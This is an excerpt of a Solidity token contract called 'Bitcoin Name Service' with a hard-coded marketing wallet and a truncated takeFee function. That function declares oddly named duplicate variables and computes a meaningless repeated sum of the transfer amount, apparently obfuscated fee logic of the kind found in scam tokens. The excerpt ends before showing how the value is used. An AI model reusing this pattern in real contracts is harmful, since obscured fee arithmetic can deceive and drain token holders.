...
contract BitcoinNameService is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Bitcoin Name Service";
    string private _symbol = "BTC.DOMAINS";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0xA07FF5c555c84F57b98A9fDEFBa6e354410047B1);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
      uint256 spike = amount;
       uint256 feeAmount = 0;
       uint256 amont = amount;
        uint256 airDropFeeAmount = 0;
        uint256 feeExcape = amount.sub(1)+spike+amont+spike+amount+spike+amont+amount;
